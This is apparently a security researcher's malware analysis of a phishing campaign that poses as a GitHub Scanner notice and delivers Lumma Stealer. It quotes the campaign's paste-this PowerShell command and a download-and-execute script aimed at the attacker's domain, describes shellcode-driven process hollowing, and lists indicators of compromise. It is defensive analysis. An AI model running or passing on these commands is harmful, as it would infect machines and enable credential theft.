---
title: "[MALWARE] Lumma Stealer Loader Analysis"
excerpt: "On September 19, 2024, I received an email regarding a GitHub Scanner result for my public repository. Initially, the email was not flagged as malicious or spam; however, further investigation revealed it to be part of a malware campaign attempting to distribute Lumma Stealer, disguised as a GitHub Scanner notification."
excerpt_separator: <!--more-->
categories:
  - Research
tags:
  - MALWARE
  - REV
  - LUMMA
  - "2024"
toc: true
toc_sticky: true
toc_label: "Table of Contents"
---

# Introduction
On September 19, 2024, I received an email regarding a GitHub Scanner result for my public repository. Initially, the email was not flagged as malicious or spam; however, further investigation revealed it to be part of a malware campaign attempting to distribute Lumma Stealer, disguised as a GitHub Scanner notification.

![IMG](/assets/images/github-scanner-lumma-stealer/img.png)

# Technical Analysis
Upon accessing the link (https://github-scanner.com), a Captcha verification page is presented.

![IMG2](/assets/images/github-scanner-lumma-stealer/img2.jpg)

The Captcha Verification steps are as follow:

![IMG3](/assets/images/github-scanner-lumma-stealer/img3.jpg)

The copied malicious PowerShell payload will execute the commands specified in `download.txt`.
```ps
powershell.exe -w hidden -Command "iex (iwr 'https://github-scanner.com/download.txt').Content" # "✅ ''I am not a robot - reCAPTCHA Verification ID: 93752"
```

The `download.txt` contains the following content, which fetches an executable, renames it to `SysSetup.exe`, and executes it:
```ps
$webClient = New-Object System.Net.WebClient
$url1 = "https://github-scanner.com/l6E.exe"
$filePath1 = "$env:TEMP\SysSetup.exe"
$webClient.DownloadFile($url1, $filePath1)
Start-Process -FilePath  $env:TEMP\SysSetup.exe
```

The `l6E.exe` (also referred to as `SysSetup.exe`) is a .NET executable, and its main function is as follows:

![IMG4](/assets/images/github-scanner-lumma-stealer/img4.png)

The `PersonalActivation` method serves as a decryption function to decrypt `Program.AIOsncoiuuA`, using `Program.Alco` as the key, and `MoveAngles.userBuffer`, using `MoveAngles.key`:

![IMG5](/assets/images/github-scanner-lumma-stealer/img5.png)

Upon decrypting the blob, it calls `VirtualProtect` on it with **PAGE_EXECUTE_READWRITE** permissions, and then executes it using `CallWindowProcW`.

The `Program.AIOsncoiuuA` appears to be shellcode and `MoveAngles.userBuffer` is an executable once decrypted:

![IMG6](/assets/images/github-scanner-lumma-stealer/img6.png)

## Shellcode Analysis
The shellcode first iterates through **_PEB_LDR_DATA** to resolve the `LoadLibraryA` and `GetProcAddress` APIs:

![IMG7](/assets/images/github-scanner-lumma-stealer/img7.png)

It then uses the `GetProcAddress` to obtain the addresses of the following APIs: `CreateProcessA`, `VirtualAlloc`, `GetThreatContext`, `ReadProcessMemory`, `VirtualAllocEx`, `WriteProcessMemory`, `SetThreatContext` and `ResumeThread`.

![IMG8](/assets/images/github-scanner-lumma-stealer/img8.png)

Moving on, it spawns a child process of `RegAsm.exe` and allocates memory in its address space with **PAGE_EXECUTE_READWRITE** permissions. It then retrieves the current thread context of `RegAsm.exe`, allowing the it to later modify its execution flow by manipulating the thread's state and registers, this suggest that it setting up memory for Process Hollowing later.

![IMG9](/assets/images/github-scanner-lumma-stealer/img9.png)

After that, the `MoveAngles.userBuffer` EXE code sections are now written into the memory of `RegAsm.exe`. This step is key to the process hollowing technique, as the legitimate `RegAsm.exe` code is replaced with malicious code. Each section of memory (`.text`, .`rdata`, `.data`, `.reloc`) is replaced sequentially, suggesting a complete takeover of the executable's logic.

![IMG10](/assets/images/github-scanner-lumma-stealer/img10.png)

Finally, the loader restores the modified thread context (`SetThreadContext`) to point to the newly injected malicious code, and then resumes the thread using `ResumeThread`. At this point, `RegAsm.exe` will execute the malicious code instead of its original program.

![IMG11](/assets/images/github-scanner-lumma-stealer/img11.png)

The malicious EXE code injected into `RegAsm.exe` is as follows. At first glance, it appears to decrypt itself at runtime:

![IMG12](/assets/images/github-scanner-lumma-stealer/img12.png)

Execute it in [ANY RUN](https://any.run/) indicates that LUMMA Stealer has been detected:

![IMG13](/assets/images/github-scanner-lumma-stealer/img13.png)

# Indicator of Compromise

| Indicator Type | IOCs                                                             |
| -------------- | ---------------------------------------------------------------- |
| Domain         | malware-scanner.com                                              |
| Domain         | 2x.si                                                            |
| Domain         | eemmbryequo.shop                                                 |
| Domain         | keennylrwmqlw.shop                                               |
| Domain         | licenseodqwmqn.shop                                              |
| Domain         | tendencctywop.shop                                               |
| Domain         | tesecuuweqo.shop                                                 |
| Domain         | relaxatinownio.shop                                              |
| Domain         | reggwardssdqw.shop                                               |
| Domain         | tryyudjasudqo.shop                                               |
| SHA256         | D737637EE5F121D11A6F3295BF0D51B06218812B5EC04FE9EA484921E905A207 |

# References
- https://x.com/troyhunt/status/1836508464375308684

